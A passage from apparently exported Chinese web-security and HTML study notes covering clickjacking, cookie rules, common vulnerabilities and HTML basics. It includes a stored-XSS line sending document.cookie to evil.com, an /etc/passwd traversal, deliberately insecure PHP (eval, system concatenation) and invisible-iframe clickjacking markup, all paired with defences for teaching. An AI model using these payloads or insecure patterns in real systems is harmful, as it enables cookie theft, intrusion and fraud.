修改账户设置\n- 更改密码\n- 添加授权设备\n```html\n<!-- 示例：隐藏的账户设置页面 -->\n<div style=\"position: relative; width: 500px; height: 300px;\">\n  <iframe src=\"https://bank.com/settings\" \n          style=\"opacity: 0.0; position: absolute;\"></iframe>\n  <div style=\"position: absolute;\">\n    点击领取优惠券！\n  </div>\n</div>\n```\n\n### 6.3. 金融安全威胁\n\n- 诱导转账\n- 购买商品\n- 确认支付\n```html\n<!-- 示例：隐藏的支付确认页面 -->\n<div class=\"game-button\">\n  <iframe src=\"https://payment.com/confirm\" \n          style=\"opacity: 0;\"></iframe>\n  点击开始游戏\n</div>\n```\n\n### 6.4. 隐私泄露\n\n- 授权访问个人信息\n- 同意隐私政策\n- 开启设备权限\n\n### 6.5. 广告欺诈\n\n- 虚假点击\n- 刷量\n- 增加广告展示\n\n## 7. 防护措施\n\n### 7.1. 服务端防护\n\n1. **X-Frame-Options 头**\n```http\n# 完全禁止iframe嵌入\nX-Frame-Options: DENY\n\n# 只允许同源嵌入\nX-Frame-Options: SAMEORIGIN\n\n# 允许特定域名嵌入\nX-Frame-Options: ALLOW-FROM https://trusted.com\n```\n\n2. **CSP frame-ancestors 指令**\n```http\n# 更现代的防护方式\nContent-Security-Policy: frame-ancestors 'none';\nContent-Security-Policy: frame-ancestors 'self';\nContent-Security-Policy: frame-ancestors https://trusted.com;\n```\n\n### 7.2. 客户端防护\n\n1. **JavaScript 框架检测**\n```javascript\n// 检测页面是否被嵌入iframe\nif (window !== window.top) {\n    window.top.location = window.location;\n}\n```\n\n2. **样式防护**\n```css\n/* 防止页面被透明化 */\nbody {\n    background-color: white !important;\n}\n```\n\n### 7.3. 重要操作防护\n\n1. **二次确认**\n```javascript\n// 关键操作需要额外确认\nfunction criticalOperation() {\n    if (window !== window.top) {\n        alert(\"安全警告：请直接访问我们的网站进行操作\");\n        return false;\n    }\n    return confirm(\"确认执行此操作？\");\n}\n```\n\n2. **验证码保护**\n```html\n<!-- 添加验证码防护 -->\n<form onsubmit=\"return validateCaptcha()\">\n    <input type=\"text\" id=\"captcha\">\n    <img src=\"/captcha.php\">\n</form>\n```\n\n## 8. 最佳实践建议\n\n### 8.1. 开发建议\n\n1. **关键操作保护**\n   - 使用验证码\n   - 要求二次确认\n   - 检测异常行为\n\n2. **框架限制**\n```javascript\n// Vue.js 示例\nnew Vue({\n    mounted() {\n        if (window !== window.top) {\n            window.top.location = window.location;\n        }\n    }\n});\n```\n\n### 8.2. 配置建议\n\n1. **同时使用多层防护**\n```http\n# 配置示例\nX-Frame-Options: SAMEORIGIN\nContent-Security-Policy: frame-ancestors 'self'\n```\n\n2. **定期安全审查**\n- 检查框架策略\n- 更新安全配置\n- 监控异常行为\n\n### 8.3. 用户教育\n\n1. 提醒用户警惕可疑链接\n2. 重要操作使用官方应用\n3. 定期检查账户活动\n\n## 9. 检测和监控\n\n### 9.1. 自动化检测\n\n```javascript\n// 定期检测页面是否被嵌入\nsetInterval(() => {\n    if (window !== window.top) {\n        console.log(\"检测到潜在的点击劫持攻击\");\n        // 采取相应措施\n    }\n}, 1000);\n```\n\n### 9.2. 日志监控\n\n```javascript\n// 记录可疑行为\nfunction logSuspiciousActivity() {\n    fetch('/api/security/log', {\n        method: 'POST',\n        body: JSON.stringify({\n            type: 'clickjacking_attempt',\n            timestamp: new Date(),\n            details: {\n                referrer: document.referrer,\n                location: window.location.href\n            }\n        })\n    });\n}\n```\n\n","wdIxBpBE":"\n# 关于 HTTP 请求中 Cookie 的行为\n\n`#前端安全`  `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. **不是自动携带所有 Cookie** \n\n- 浏览器只会自动携带与请求的域名匹配的 Cookie\n- Cookie 必须满足以下条件才会被自动携带：\n\t- 域名匹配（Domain 属性）\n\t- 路径匹配（Path 属性）\n\t- 未过期（Expires/Max-Age 属性）\n\t- 符合 SameSite 策略\n\n## 2. **影响 Cookie 发送的关键属性**：\n\n   - `Domain`：指定 Cookie 可以发送到哪些域名\n   - `Path`：指定 Cookie 在哪些路径下可用\n   - `Secure`：只在 HTTPS 连接中发送\n   - `SameSite`：控制跨站请求时是否发送\n     - `Strict`：最严格，完全禁止跨站发送\n     - `Lax`：默认值，允许部分跨站（如链接跳转）\n     - None：允许跨站（需要配合 Secure 使用）\n\n## 3. **常见场景**：\n\n   ```javascript\n   // 服务器设置 Cookie\n   Set-Cookie: user_id=123; Domain=example.com; Path=/; Secure; SameSite=Lax\n   ```\n   \n   - 这个 Cookie 只会在访问 example.com 及其子域名时自动携带\n   - 只在 `HTTPS` 连接中发送\n   - 遵循 `SameSite=Lax` 的跨站规则\n\n## 4. **跨域请求（CORS）**：\n\n- 默认情况下，跨域请求不会携带 Cookie\n- 需要特别设置才能在跨域请求中发送 Cookie：\n\n\n\n```javascript\n// 前端设置\nfetch(url, {\n\tcredentials: 'include'  // 允许发送跨域 Cookie\n});\n\n// 后端设置\nAccess-Control-Allow-Credentials: true\n```\n\n我来系统地总结一下关于 HTTP 请求携带 Cookie 的重要知识点：\n\n## 5. Cookie 携带的基本原则\n\n### 5.1. 同源请求\n\n- 默认情况下，**同源请求会自动携带相应的 Cookie**\n- 同源指：\n\t- 协议（Protocol）\n\t- 域名（Domain）\n\t- 端口（Port）都相同\n\n### 5.2. 跨域请求\n\n- 默认不携带 Cookie\n- 需要同时满足前后端的特定配置才能携带\n\n## 6. Cookie 属性对携带的影响\n\n### 6.1. Domain 属性\n\n- 决定 Cookie 可以被发送到哪些域名\n- 示例：\n```plaintext\nDomain=example.com     // 可以发送到 example.com 及其子域名\nDomain=sub.example.com // 只能发送到特定子域名\n```\n\n### 6.2. Path 属性\n\n- **指定在哪些路径下可以发送 Cookie**\n- 示例：\n  ```plaintext\n  Path=/       // 所有路径\n  Path=/admin  // 只在 /admin 及其子路径\n  ```\n\n### 6.3. Secure 属性\n\n- 设置后只在 `HTTPS 连接`中发送\n- 提高安全性\n```plaintext\nSet-Cookie: name=value; Secure\n```\n\n### 6.4. SameSite 属性\n\n- 控制跨站请求时的 Cookie 发送行为\n```plaintext\nSet-Cookie: name=value; SameSite=Strict  // 禁止跨站发送\nSet-Cookie: name=value; SameSite=Lax     // 默认值，允许部分跨站\nSet-Cookie: name=value; SameSite=None    // 允许跨站（需要 Secure）\n```\n\n## 7. 跨域请求携带 Cookie 的配置\n\n### 7.1. 前端配置\n\n```javascript\n// 使用 fetch\nfetch(url, {\n  credentials: 'include'  // 允许跨域携带 Cookie\n});\n\n// 使用 axios ，它使用的就是 xhr \naxios.defaults.withCredentials = true;\n\n// 使用 XMLHttpRequest\nxhr.withCredentials = true;\n```\n\n### 7.2. 后端配置\n\n```javascript\n// Node.js Express 示例\nres.header('Access-Control-Allow-Credentials', 'true');\nres.header('Access-Control-Allow-Origin', 'https://specific-origin.com');\n// 注意：允许携带凭证时，Access-Control-Allow-Origin 不能为 *\n```\n\n## 8. 特殊场景\n\n### 8.1. 第三方 Cookie\n\n- 现代浏览器increasingly限制第三方 Cookie\n- Safari 和 Firefox 默认阻止第三方 Cookie\n- Chrome 计划在2024年逐步淘汰第三方 Cookie\n\n### 8.2. 移动端 WebView\n\n- Cookie 行为可能因平台而异\n- iOS WKWebView 需要特别配置才能支持 Cookie\n\n## 9. 安全考虑\n\n### 9.1. CSRF 防护\n\n- Cookie 自动携带可能导致 CSRF 攻击\n- 建议：\n\t- 使用 **CSRF Token**\n\t- 合理设置 `SameSite` 属性\n\t- 实施其他安全措施\n\n### 9.2. Cookie 大小限制\n\n- 单个 Cookie 通常限制为 **4KB**\n- 域名总 Cookie 数量有限制（因浏览器而异）\n\n\n## 11. 最佳实践\n\n1. **安全性**\n   - 总是使用 Secure 属性（HTTPS）\n   - 适当设置 SameSite 属性\n   - 设置合适的过期时间\n2. **性能**\n   - 控制 Cookie 大小\n   - 只在必要时携带 Cookie\n3. **兼容性**\n   - 考虑浏览器兼容性\n   - 做好降级处理\n4. **维护性**\n   - 规范 Cookie 命名\n   - 及时清理过期 Cookie\n\n","9DjPLYtT":"\n# 常见的高危Web安全漏洞\n\n`#前端安全` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. SQL 注入 (SQL Injection) \n\n### 1.1. 危害级别：严重\n\n- 可直接访问/操作数据库\n- 可能导致数据泄露\n- 可能导致数据被篡改\n\n### 1.2. 示例漏洞代码：\n\n```php\n// 不安全的查询\n$query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];\n\n// 安全的查询（使用参数化）\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n```\n\n## 2. 远程代码执行 (RCE - Remote Code Execution)\n\n### 2.1. 危害级别：严重\n\n- 可在服务器上执行任意代码\n- 可能导致服务器被完全控制\n\n### 2.2. 示例漏洞代码：\n\n```php\n// 危险的代码\neval($_GET['code']);\n\n// 不安全的系统命令执行\nsystem(\"ping \" . $_GET['ip']);\n```\n\n## 3. 文件包含漏洞 (File Inclusion)\n\n### 3.1. 本地文件包含 (LFI)\n\n```php\n// 危险的包含\ninclude($_GET['page'] . \".php\");\n\n// 可能导致敏感文件泄露\n/index.php?page=../../../etc/passwd\n```\n\n### 3.2. 远程文件包含 (RFI)\n\n```php\n// 危险的远程包含\ninclude(\"http://\" . $_GET['url']);\n```\n\n## 4. 跨站脚本 (XSS - Cross-Site Scripting)\n\n### 4.1. 反射型 XSS\n\n```html\n<!-- 不安全的输出 -->\n<div>Welcome <?php echo $_GET['name']; ?></div>\n\n<!-- 安全的输出 -->\n<div>Welcome <?php echo htmlspecialchars($_GET['name']); ?></div>\n```\n\n### 4.2. 存储型 XSS\n\n```javascript\n// 数据库中存储的恶意脚本\n<script>\n    new Image().src = 'http://evil.com/steal.php?cookie=' + document.cookie;\n</script>\n```\n\n### 4.3. DOM型 XSS\n\n```javascript\n// 不安全的 DOM 操作\ndocument.getElementById('div').innerHTML = location.hash.substring(1);\n```\n\n## 5. 文件上传漏洞\n\n### 5.1. 危害级别：高\n\n- **可上传恶意文件**\n- **可能导致代码执行**\n\n### 5.2. 示例：\n\n```php\n// 不安全的文件上传\nmove_uploaded_file($_FILES['file']['tmp_name'], \n                  '/uploads/' . $_FILES['file']['name']);\n\n// 安全的文件上传\n$allowed = ['jpg', 'png', 'gif'];\n$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);\nif (in_array($ext, $allowed)) {\n    // 处理上传\n}\n```\n\n## 6. SSRF (Server-Side Request Forgery)\n\n### 6.1. 危害级别：高\n\n- 可访问内网资源\n- 可绕过防火墙\n\n### 6.2. 示例：\n\n```php\n// 不安全的实现\n$url = $_GET['url'];\n$content = file_get_contents($url);\n\n// 安全的实现\n$allowedHosts = ['api.example.com'];\n$host = parse_url($url, PHP_URL_HOST);\nif (in_array($host, $allowedHosts)) {\n    $content = file_get_contents($url);\n}\n```\n\n## 7. 反序列化漏洞\n\n### 7.1. 危害级别：高\n\n- 可能导致代码执行\n- 可能导致数据泄露\n\n### 7.2. 示例：\n\n```php\n// 不安全的反序列化\n$data = unserialize($_GET['data']);\n\n// 安全的实现\n$data = json_decode($_GET['data'], true);\n```\n\n## 8. 权限控制缺陷\n\n### 8.1. 越权访问\n\n```php\n// 不安全的实现\n$userId = $_GET['id'];\n$data = getUserData($userId);\n\n// 安全的实现\nif (isAuthorized($currentUser, $userId)) {\n    $data = getUserData($userId);\n}\n```\n\n### 8.2. 未授权访问\n\n```php\n// 需要添加认证检查\nfunction adminPanel() {\n    if (!isAdmin()) {\n        die('Unauthorized');\n    }\n    // 管理面板代码\n}\n```\n\n## 9. 安全配置错误\n\n### 9.1. 敏感信息泄露\n\n```nginx\n# 不安全的 Nginx 配置\nlocation ~ \\.git {\n    # 没有限制访问\n}\n\n# 安全的配置\nlocation ~ \\.git {\n    deny all;\n}\n```\n\n### 9.2. 默认配置\n\n```apache\n# 危险的 Apache 配置\nOptions Indexes FollowSymLinks\n# 显示目录列表\n```\n\n## 10. 敏感信息泄露\n\n### 10.1. 接口响应中的敏感数据\n\n```json\n// 不安全的接口响应\n{\n    \"username\": \"zhang_san\",\n    \"mobile\": \"13800138000\",\n    \"idCard\": \"310123199001011234\",  // 身份证号\n    \"bankCard\": \"6222021234567890\",  // 银行卡号\n    \"password\": \"md5_hash\",          // 密码哈希\n    \"salt\": \"abc123\",                // 密码盐值\n    \"sessionToken\": \"xyz789\"         // 会话令牌\n}\n\n// 安全的接口响应\n{\n    \"username\": \"zhang_san\",\n    \"mobile\": \"138****8000\",         // 脱敏处理\n    \"idCard\": \"310123********1234\",  // 脱敏处理\n    \"bankCard\": \"6222**********7890\" // 脱敏处理\n}\n```\n\n### 10.2. 错误信息泄露\n\n```javascript\n// 不安全的错误响应\n{\n    \"error\": \"Database connection failed: mysql://root:password@localhost:3306/db\",\n    \"stackTrace\": \"详细的堆栈信息...\",\n    \"sqlQuery\": \"SELECT * FROM users WHERE id = 123\"\n}\n\n// 安全的错误响应\n{\n    \"error\": \"System error\",\n    \"code\": \"DB_001\",\n    \"requestId\": \"req_abc123\"  // 用于日志追踪\n}\n```\n\n## 11. 接口安全漏洞\n\n### 11.1. 接口未授权访问\n\n```javascript\n// 不安全的接口\napp.get('/api/user/info', (req, res) => {\n    const userId = req.query.id;\n    return getUserInfo(userId);\n});\n\n// 安全的接口\napp.get('/api/user/info', authenticate, (req, res) => {\n    const userId = req.user.id;  // 只能访问自己的信息\n    return getUserInfo(userId);\n});\n```\n\n### 11.2. 批量请求漏洞\n\n```javascript\n// 可能导致信息泄露的批量查询\napp.post('/api/users/batch', (req, res) => {\n    const userIds = req.body.ids;\n    return getAllUsersInfo(userIds);  // 可能被用来枚举用户信息\n});\n\n// 安全的实现\napp.post('/api/users/batch', authenticate, (req, res) => {\n    const userIds = req.body.ids;\n    if (userIds.length > 100) {\n        return res.status(400).json({ error: 'Too many requests' });\n    }\n    // 检查权限\n    if (!canAccessUsers(req.user, userIds)) {\n        return res.status(403).json({ error: 'Forbidden' });\n    }\n    return getAllUsersInfo(userIds);\n});\n```\n\n### 11.3. 接口频率限制缺失\n\n```javascript\n// 添加速率限制中间件\nconst rateLimit = require('express-rate-limit');\n\nconst apiLimiter = rateLimit({\n    windowMs: 15 * 60 * 1000, // 15分钟\n    max: 100,  // 限制每个IP 100次请求\n    message: 'Too many requests from this IP'\n});\n\napp.use('/api/', apiLimiter);\n```\n\n## 12. 业务逻辑漏洞\n\n### 12.1. 订单金额篡改\n\n```javascript\n// 不安全的订单处理\napp.post('/api/order', (req, res) => {\n    const { productId, price, quantity } = req.body;\n    const total = price * quantity;  // 直接使用前端传来的价格\n});\n\n// 安全的订单处理\napp.post('/api/order', (req, res) => {\n    const { productId, quantity } = req.body;\n    const product = await Product.findById(productId);\n    const total = product.price * quantity;  // 使用后端查询的价格\n});\n```\n\n### 12.2. 越权操作\n\n>  比如 `companyId` 为 0,1,2，我暴力遍历之\n\n```javascript\n// 不安全的数据访问\napp.get('/api/company/:companyId/employees', (req, res) => {\n    const employees = await Employee.find({\n        companyId: req.params.companyId\n    });\n    return employees;\n});\n\n// 安全的数据访问\napp.get('/api/company/:companyId/employees', authenticate, (req, res) => {\n    // 检查用户是否有权限访问该公司数据\n    if (!await hasCompanyAccess(req.user, req.params.companyId)) {\n        return res.status(403).json({ error: 'Forbidden' });\n    }\n    const employees = await Employee.find({\n        companyId: req.params.companyId\n    });\n    return employees;\n});\n```\n\n## 13. 配置和环境安全\n\n### 13.1. 环境变量泄露\n\n```javascript\n// 不安全的配置接口\napp.get('/api/config', (req, res) => {\n    return {\n        dbUrl: process.env.DB_URL,\n        apiKeys: process.env.API_KEYS,\n        secretKey: process.env.SECRET_KEY\n    };\n});\n\n// 安全的配置接口\napp.get('/api/config', (req, res) => {\n    return {\n        apiVersion: '1.0',\n        environment: process.env.NODE_ENV,\n        features: ['feature1', 'feature2']\n    };\n});\n```\n\n### 13.2. 调试信息泄露\n\n```javascript\n// 生产环境禁用调试信息\nif (process.env.NODE_ENV === 'production') {\n    app.set('env', 'production');\n    app.disable('x-powered-by');\n    app.use(morgan('combined'));  // 使用简化的日志\n} else {\n    app.use(morgan('dev'));      // 开发环境使用详细日志\n}\n```\n\n## 14. 防护建议\n\n### 14.1. 数据脱敏处理\n\n```javascript\n// 通用脱敏函数\nfunction maskSensitiveData(data, type) {\n    switch(type) {\n        case 'mobile':\n            return data.replace(/(\\d{3})\\d{4}(\\d{4})/, '$1****$2');\n        case 'idCard':\n            return data.replace(/(\\d{6})\\d{8}(\\d{4})/, '$1********$2');\n        case 'email':\n            return data.replace(/(.{3}).*(@.*)/, '$1***$2');\n        // 更多类型...\n    }\n}\n```\n\n### 14.2. 响应数据过滤\n\n```javascript\n// 过滤敏感字段\nfunction filterSensitiveFields(data) {\n    const sensitiveFields = ['password', 'salt', 'token', 'secretKey'];\n    if (typeof data === 'object') {\n        return Object.keys(data).reduce((acc, key) => {\n            if (!sensitiveFields.includes(key)) {\n                acc[key] = data[key];\n            }\n            return acc;\n        }, {});\n    }\n    return data;\n}\n```\n\n### 14.3. 接口访问控制\n\n```javascript\n// 访问控制中间件\nfunction accessControl(resource) {\n    return async (req, res, next) => {\n        const user = req.user;\n        const resourceId = req.params.id;\n        \n        try {\n            const hasAccess = await checkAccess(user, resource, resourceId);\n            if (!hasAccess) {\n                return res.status(403).json({\n                    error: 'Access denied',\n                    code: 'FORBIDDEN'\n                });\n            }\n            next();\n        } catch (error) {\n            next(error);\n        }\n    };\n}\n```\n\n### 14.4. 日志审计\n\n```javascript\n// 审计日志中间件\nfunction auditLog(req, res, next) {\n    const startTime = Date.now();\n    \n    // 响应完成后记录日志\n    res.on('finish', () => {\n        const duration = Date.now() - startTime;\n        logger.info({\n            method: req.method,\n            path: req.path,\n            userId: req.user?.id,\n            ip: req.ip,\n            duration,\n            status: res.statusCode\n        });\n    });\n    \n    next();\n}\n```\n\n### 14.5. 安全检查清单\n\n1. 检查所有接口的授权要求\n2. 实施数据访问控制\n3. 对敏感数据进行脱敏处理\n4. 实施接口调用频率限制\n5. 记录关键操作审计日志\n6. 定期进行安全测试\n7. 监控异常访问模式\n8. 实施数据加密传输\n9. 配置适当的CORS策略\n10. 使用HTTPS传输\n\n","gL5JSPSV":"\n# HTML 篇\n\n`#前端` `#HTML` \n\n\n## 目录\n<!-- toc -->\n ## 参考 \n\n- [GPT-4o](https://chatgpt.com/)\n- [Claude 3.5 Sonnet](https://www.anthropic.com/news/claude-3-5-sonnet?locale=zh_CN)\n- [web.dev](https://web.dev/learn/html/welcome?continue=https%3A%2F%2Fweb.dev%2Flearn%2Fhtml&hl=zh-cn#article-https://web.dev/learn/html/welcome&hl=zh-cn)\n- [HTML 语言简介](https://wangdoc.com/html/intro#%E6%A0%87%E7%AD%BE)\n- [HTML 简介 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Introduction_to_HTML)\n- [https://whatwg-cn.github.io/html/](https://whatwg-cn.github.io/html/)\n- [https://whatwg.org/?locale=zh_CN](https://whatwg.org/?locale=zh_CN)\n- [https://html.spec.whatwg.org/?locale=zh_CN](https://html.spec.whatwg.org/?locale=zh_CN)\n- [ARIA - 无障碍 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/Accessibility/ARIA)\n","90hUvtCp":"\n# HTML 概述\n\n\n`#前端` `#HTML`  `#R2` \n\n\n## 目录\n<!-- toc -->\n ## 什么是 HTML？ \n\n- HTML 的全名是“超文本标记语言”（HyperText Markup Language），可以说有了它，才有互联网的**内容**。\n- 它是用于构建网页的基本语言，用于定义网页的结构和内容\n- 任何网站的请求，第一个请求回来的资源就是`.html` 文件。\n\n## HTML 元素基本格式\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/5807dd04c7c94cbf0070e1ea5ec7d024.png)\n\n## HTML 基本结构\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>页面标题</title>\n  </head>\n  <body>\n    <h1>欢迎</h1>\n    <p>这是一个段落。</p>\n  </body>\n</html>\n```\n\n","2caSzbyF":"\n# HTML 标签与 HTML 属性\n\n\n`#前端` `#HTML` \n\n\n## 目录\n<!-- toc -->\n ## 1. 说说 `<meta>` 标签的用处？ \n\n使用 `<meta>` 标记 Metadata \n> 更多参考：[https://web.dev/learn/html/metadata?hl=zh-cn](https://web.dev/learn/html/metadata?hl=zh-cn)\n\n## 2. 标签语义化是什么意思？\n\n每个标签都有语义，需要注意使用场景，比如下图：\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/acc28644f26ef7363764d208cbc08ba3.png)\n\n## 3. 列举一些不常用但特别有用的标签\n\n### 3.1. abbr：缩写 abbreviation\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/dd23fcc1f51d799987d70f160ed51031.png)\n\n### 3.2. 展示计算机代码\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/3949d49f5800384366ecff6d88bc091b.png)\n\n> 所以不只有`pre/code` ，但其他确实不太常用\n\n### 3.3. 对话框\n\n```html\n<dialog open>\n  <p>Greetings, one and all!</p>\n  <form method=\"dialog\">\n    <button>OK</button>\n  </form>\n</dialog>\n```\n\n### 3.4. 其他：HTML 元素，多看 MDN\n\n> **这里只是强调您可能还有很多标签元素没有使用过，建议多多参考文档**\n\n> 更多参考： https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a\n\n## 4. 说说 HTML 属性有哪些类型？\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/e5d1702720265eaec8f3a3af0dce9349.png)\n\n又分`布尔属性`、`枚举属性`、`全局属性`及`自定义属性`，可见下面代码示例\n\n```html\n<input required>\n<section id=\"reg\"/>\n<blockquote data-machine-learning=\"workshop\"></blockquote>\n```\n\n> 更多可参考：[网页元素的属性](https://wangdoc.com/html/attribute)\n\n## 5. 列举多媒体嵌入相关的标签\n\n- 常见标签为`<img> 、<video> 、<audio>、、<iframe>、<embed> 、 <object>、<track>、<param>`\n\t- 可插入如图片、视频、音频、网页、字幕\n- `<embed>` 和 `<object>` : \n\t- 可嵌入各类资源，如音频、视频、pdf 文件等\n\n>  多媒体标签的一些事件往往都不支持冒泡！\n\n> 更多参考：\n> [多媒体与嵌入 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Multimedia_and_embedding)\n> [多媒体标签](https://wangdoc.com/html/multimedia#embed)\n\n","Y9N13bSV":"\n# HTML 技术关键词\n\n\n`#前端` `#HTML` `#R2`  \n\n\n## 目录\n<!-- toc -->\n ## 1. HTML 技术 \n\n1. 语义化标签：如header, nav, main, article, section, aside, footer等\n2. 表单元素：input, select, textarea, button等\n3. 多媒体标签：audio, video, canvas, svg\n4. 元数据：meta标签，用于定义页面的各种元数据\n5. 响应式设计：使用viewport meta标签和媒体查询\n6. 无障碍性（Accessibility）：使用aria属性，alt文本等\n7. 结构化数据：使用microdata, RDFa, JSON-LD等\n8. 离线Web应用：使用manifest文件（现在更多使用Service Workers）\n9. 本地存储：localStorage, sessionStorage\n10. **拖放API：drag and drop**\n11. 地理定位：Geolocation API\n12. Web Workers：用于在后台运行脚本\n13. WebSockets：用于实时双向通信\n14. 跨文档消息传递：postMessage API\n15. 内容安全策略（CSP）：用于防止XSS攻击\n16. 自定义数据属性：`data-属性`\n17. 模板：template标签\n18. **图片响应式：srcset和sizes属性**\n19. 延迟加载：使用 loading=\"lazy\" 属性\n\t1. ==标准本来就支持==\n20. 表单验证：使用 pattern, required 等属性\n21. 输入类型：如date, time, email, url等\n22. 字符编码：使用UTF-8\n23. DOCTYPE声明：\n24. 语言声明：lang属性\n25. 链接关系：rel 属性，如 stylesheet , icon 等\n26. 跨域资源共享（CORS）：通过 HTTP头部控制\n27. 内容可编辑：contenteditable 属性\n28. 自动完成：autocomplete 属性\n29. 页面可见性API：用于检测页面是否可见\n30. 历史API：用于操作浏览历史\n\n## 2. HTMl 技术\n\n### 2.1. 基础知识\n\n- **HTML (HyperText Markup Language)**: 超文本标记语言\n- **DOCTYPE**: 文档类型声明\n- **元素 (Element)**: HTML的基本构建块\n- **标签 (Tag)**: 用于定义HTML元素的标记\n- **属性 (Attribute)**: 提供元素的附加信息\n\n### 2.2. 常用标签\n\n- `<html>`: 定义HTML文档的根元素\n- `<head>`: 包含文档的元数据\n- `<title>`: 定义文档的标题\n- `<meta>`: 提供文档的元数据\n- `<link>`: 链接外部资源\n- `<script>`: 嵌入或引用JavaScript代码\n- `<style>`: 嵌入CSS样式\n- `<body>`: 定义文档的主体内容\n- `<header>`: 定义页面或节的头部\n- `<footer>`: 定义页面或节的尾部\n- `<nav>`: 定义导航链接\n- `<main>`: 定义文档的主要内容\n- `<section>`: 定义文档的节\n- `<article>`: 定义独立的内容块\n- `<aside>`: 定义侧边栏内容\n- `<h1>` 到 `<h6>`: 定义标题\n- `<p>`: 定义段落\n- `<a>`: 定义超链接\n- `<img>`: 定义图像\n- `<ul>`: 定义无序列表\n- `<ol>`: 定义有序列表\n- `<li>`: 定义列表项\n- `<table>`: 定义表格\n- `<tr>`: 定义表格行\n- `<td>`: 定义表格单元\n- `<th>`: 定义表格头单元\n- `<form>`: 定义表单\n- `<input>`: 定义输入控件\n- `<button>`: 定义按钮\n- `<textarea>`: 定义多行文本输入控件\n- `<select>`: 定义下拉列表\n- `<option>`: 定义下拉列表中的选项\n- `<label>`: 定义表单控件的标签\n- `<div>`: 定义文档中的分区或区域\n- `<span>`: 定义文档中的行内元素\n\n### 2.3. 表单和输入类型\n\n- `<input>` 类型:\n\t- `text, password, email, url, number, date, time, checkbox, radio, file, submit, reset, button, hidden, color, range, search, tel\n- **表单验证属性**:\n\t- `required, pattern, min, max, minlength, maxlength, step`\n\n### 2.4. 多媒体标签\n\n- `<audio>`: 定义音频内容\n- `<video>`: 定义视频内容\n- `<source>`: 定义多媒体资源\n- `<track>`: 定义视频和音频的文本轨道\n\n### 2.5. 图形和绘图\n\n- `<canvas>`: 用于绘制图形\n\t- 2d\n\t- 3d \n\t\t- webGL\n- **SVG (Scalable Vector Graphics)**: 可缩放矢量图形\n\n### 2.6. 响应式设计\n\n- `<meta name=\"viewport\">`: \n\t- 定义视口属性\n- **媒体查询 (Media Queries)**:\n\t- 用于响应式设计的CSS技术\n\n### 2.7. 本地存储\n\n- **localStorage**:\n\t- 本地存储数据\n- **sessionStorage**: \n\t- 会话存储数据\n\n### 2.8. Web Components\n\n- **自定义元素 (Custom Elements)**:\n\t- 创建==自定义 HTML 标签==\n- **Shadow DOM**:\n\t- 隐藏DOM树\n- **HTML模板 (HTML Templates)**:\n\t- 定义可重用的HTML片段\n\n### 2.9. 语义化和可访问性\n\n- **语义化标签**: \n\t- `<header>`, `<footer>`, `<nav>`, `<main>`, `<section>`, `<article>`, `<aside>`\n- **ARIA (Accessible Rich Internet Applications)**:\n\t- 增强可访问性的属性\n\n### 2.10. 安全和性能\n\n- **内容安全策略 (CSP)**: \n\t- 防止XSS攻击\n- **懒加载 (Lazy Loading)**:\n\t- 延迟加载图像和其他资源\n- **预加载 (Preloading)**: \n\t- 提前加载关键资源\n\n### 2.11. 其他相关技术\n\n- **HTML5**: \n\t- HTML 的最新版本\n- **CSS (Cascading Style Sheets)**: \n\t- 层叠样式表，用于样式和布局\n- **JavaScript**: \n\t- 用于交互和动态内容的编程语言\n- **DOM (Document Object Model)**: \n\t- 文档对象模型\n- **SEO (Search Engine Optimization)**: \n\t- 搜索引擎优化\n\n\n","wCioUwdB":"\n# HTML 技术清单\n\n\n`#前端` `#HTML` \n\n\n## 目录\n<!-- toc -->\n ## 1. **HTML5** \n\n- **介绍**：HTML的最新版本，提供了许多新特性 和 API。\n- **特点**：语义化标签、新的表单控件、多媒体支持（audio、video）、本地存储（localStorage、sessionStorage）\n\n## 2. **语义化标签**\n\n- **介绍**：使用具有明确含义的标签来构建页面结构。\n- **特点**：提高可读性和可维护性、增强SEO、改善无障碍访问。\n- **示例**：`<header>`, `<footer>`, `<article>`, `<section>`, `<nav>`, `<aside>`。\n\n## 3. **表单元素和验证**\n\n- **介绍**：HTML5 引入了许多新的表单控件和属性，简化了表单的创建和验证。\n- **特点**：新的输入类型（如`email`, `url`, `date`）、表单验证属性（如`required`, `pattern`）、增强的用户体验。\n\n## 4. **多媒体元素**\n\n- **介绍**：HTML5 引入了原生的多媒体支持。\n- **特点**：`<audio>`和`<video>`标签，支持嵌入音频和视频内容，无需第三方插件。\n\n## 5. **Canvas**\n\n- **介绍**：用于绘制2D图形的HTML元素。\n- **特点**：通过JavaScript绘制图形、动画和游戏。\n\n## 6. **SVG**\n\n- **介绍**：可缩放矢量图形，基于XML的图像格式。\n- **特点**：高质量的图形、可交互、可动画化、支持CSS样式。\n\n## 7. **本地存储**\n\n- **介绍**：HTML5 提供了两种本地存储机制：localStorage 和 sessionStorage。\n- **特点**：\n\t- 持久化存储（localStorage）、会话存储（sessionStorage）、简化客户端数据管理。\n\t- 还有 indexDB \n\n## 8. **离线支持**\n\n- **介绍**：通过`<manifest>`文件 和`Service Workers`实现离线支持。\n- **特点**：离线访问、缓存资源、提高应用的可靠性。\n\n## 9. **Web Workers**\n\n- **介绍**：在后台线程中运行JavaScript代码，避免阻塞主线程。\n- **特点**：并行处理、提高性能、增强用户体验。\n\n## 10. **ARIA（Accessible Rich Internet Applications）**\n\n- **介绍**：一组属性，用于增强Web内容的可访问性。\n- **特点**：改善无障碍访问、提高屏幕阅读器支持、增强用户体验。\n\n## 11. **自定义数据属性**\n\n- **介绍**：使用`data-*`属性在HTML元素中存储自定义数据。\n- **特点**：灵活的数据存储、简化 JavaScript 交互。\n\n## 12. **模板元素**\n\n- 